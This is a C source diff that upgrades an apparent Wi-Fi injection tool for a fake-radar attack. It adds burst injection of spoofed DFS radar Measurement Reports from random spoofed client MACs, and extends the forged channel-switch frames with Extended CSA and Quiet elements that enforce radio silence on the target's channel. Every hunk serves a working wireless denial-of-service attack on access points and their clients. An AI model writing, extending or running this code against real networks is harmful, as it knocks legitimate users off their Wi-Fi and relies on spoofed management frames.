@@ -1160,7 +1160,7 @@ static uint8_t pick_safe_ch(uint8_t cur, uint8_t preferred) {
  * Addressed Client→AP so the AP processes the radar claim.
  */
 static int mk_dfs_radar_report(uint8_t *b, const uint8_t bss[6],
-                               const uint8_t cli[6], uint8_t cur_ch) {
+                               const uint8_t cli[6], uint8_t cur_ch, uint8_t token) {
   int o = 0;
   o += mk_rt(b + o);
   /* Client → AP (addr1=BSSID, addr2=Client, addr3=BSSID) */
@@ -1168,7 +1168,7 @@ static int mk_dfs_radar_report(uint8_t *b, const uint8_t bss[6],
 
   b[o++] = 0; /* Category: Spectrum Management */
   b[o++] = 1; /* Action: Measurement Report */
-  b[o++] = 1; /* Dialog Token */
+  b[o++] = token; /* [UPGRADE] Dynamic Dialog Token */
 
   /* Measurement Report IE (ID=39, len=15) — Basic Report + Radar map */
   b[o++] = 39;     /* Element ID: Measurement Report */
@@ -1231,6 +1231,24 @@ static int mk_dfs_vacate_csa(uint8_t *b, const uint8_t bss[6], const char *ssid,
   c->ch = safe_ch;
   c->count = 0; /* switch immediately */
   o += sizeof(csa_ie_t);
+
+  /* [UPGRADE] Extended CSA IE (ID=60, len=4) for modern 5GHz clients */
+  b[o++] = 60;
+  b[o++] = 4;
+  b[o++] = 1; /* switch mode */
+  b[o++] = 115; /* operating class (always 5G for DFS) */
+  b[o++] = safe_ch;
+  b[o++] = 0; /* switch count */
+
+  /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence on old channel */
+  b[o++] = 40;
+  b[o++] = 6;
+  b[o++] = 1; /* quiet count */
+  b[o++] = 1; /* quiet period */
+  uint16_t qdur = htole16(100); /* 100 TU radio silence */
+  memcpy(b + o, &qdur, 2); o += 2;
+  uint16_t qoff = htole16(0);
+  memcpy(b + o, &qoff, 2); o += 2;
 
   return o;
 }
@@ -1641,7 +1659,7 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   /* DFS Fake Radar: Measurement Report (radar) + vacate CSA pair */
   uint8_t safe = pick_safe_ch(cur_ch, (uint8_t)new_ch);
   f->dfs_radar_report.len =
-      mk_dfs_radar_report(f->dfs_radar_report.buf, bss, cli, cur_ch);
+      mk_dfs_radar_report(f->dfs_radar_report.buf, bss, cli, cur_ch, 42);
   f->dfs_vacate_csa.len =
       mk_dfs_vacate_csa(f->dfs_vacate_csa.buf, bss, t->ssid, cur_ch, safe);
 
@@ -4148,20 +4166,25 @@ static void *stress_injector_thread(void *arg) {
       }
 
       if (a->cfg->vec_on[VEC_DFS_FAKE_RADAR]) {
-        uint8_t fake_cli[6];
-        rand_mac(fake_cli);
         uint8_t cur = (uint8_t)snap[i].channel;
         uint8_t safe = pick_safe_ch(cur, 36);
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
 
-        len = mk_dfs_radar_report(tmp, bss, fake_cli, cur);
-        if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
-          sent_for_ap++;
-        } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+        /* [UPGRADE] Burst inject Measurement Reports from multiple spoofed clients */
+        for (int burst = 0; burst < 3; burst++) {
+          uint8_t fake_cli[6];
+          rand_mac(fake_cli);
+          
+          len = mk_dfs_radar_report(tmp, bss, fake_cli, cur, (seq + burst) & 0xFF);
+          if (inject_one(sock, tmp, len) > 0) {
+            atomic_fetch_add(&g_pkts_sent, 1);
+            sent_for_ap++;
+          } else {
+            atomic_fetch_add(&g_pkts_fail, 1);
+          }
         }
 
+        /* Followed by spoofed vacate CSA with ECSA and Quiet Element */
         len = mk_dfs_vacate_csa(tmp, bss, ssid, cur, safe);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
